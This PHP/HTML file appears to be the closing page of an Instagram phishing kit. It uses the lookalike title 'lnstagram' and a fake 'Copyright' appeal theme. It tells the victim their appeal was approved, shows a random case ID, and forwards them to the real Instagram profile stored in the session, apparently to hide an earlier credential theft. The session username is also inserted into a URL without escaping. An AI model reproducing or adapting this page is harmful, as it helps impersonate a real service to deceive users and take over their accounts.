<?php
//Coded by Lüpen & Pharaben
//Coded by Lüpen & Pharaben
session_start();
$id=$_SESSION['username'];
//Coded by Lüpen & Pharaben
function space($our_qen){
for( $i=0;$i<$our_qen;$i++){
	echo "<br>";
}
}
//Coded by Lüpen & Pharaben
?>

<!DOCTYPE html>
<html>
<!--Coded by Lüpen & Pharaben-->
<head>
	<link rel="stylesheet" href="css/xss1.css">
	<link rel="stylesheet" type="text/css" href="css/xss2.css">
	<link rel="stylesheet" href="css/xss3.css">
	<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
	<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
	<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
	<title>Copyright | lnstagram</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1, user-scalable=no">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">
	<style media="screen">
		.b-tn{
			background: #fff;
			border: 0.3ex solid black;
			width: 80px;
			height: 35px;
			outline: none;
			cursor: pointer;
			border-radius: 5px;
			margin-bottom: 15px;
			padding-top: 4px;
		}
	</style>
</head>
<body>
<br>
<!--Coded by Lüpen & Pharaben-->
	</header>
<!---->
	<center>
	<div class="home" style="max-width: 90%!important;">
<br>
<br><br>
				<div class="next" style="background:#fff;color: black!important; border-radius:10px;">
<img src="https://s4.gifyu.com/images/1618350172623f8cf25e172c0a89a.png" width="190" style="border-radius:50%;margin-top:30px;margin-bottom:25px;" align="center">
				<br>
				<h1 class="allare2" style="color: black!important;"></h1>
				<img src="https://emoji.gg/assets/emoji/6943_Verified.gif" width="70">
<!--Coded by Lüpen & Pharaben-->
				<p class="text5" style="color: black!important;">
					Thank You Dear User!<br><br>
		Your Appeal Has Been Approved Successfully. Thank you for your attention to Instagram terms and conditions of use.
		<br><br>
		Case Id: #<?=rand(5675,324654);?>
				</p>
				<form action="https://www.instagram.com/<?php echo $id?>">
						<button class="b-tn"name="button">Home</button>
				</form>


			<br>
		</div>
<br><br><br><br>
<!--Coded by Lüpen & Pharaben-->
</div>

<br>
</div>
</center>
<!---->
<center>
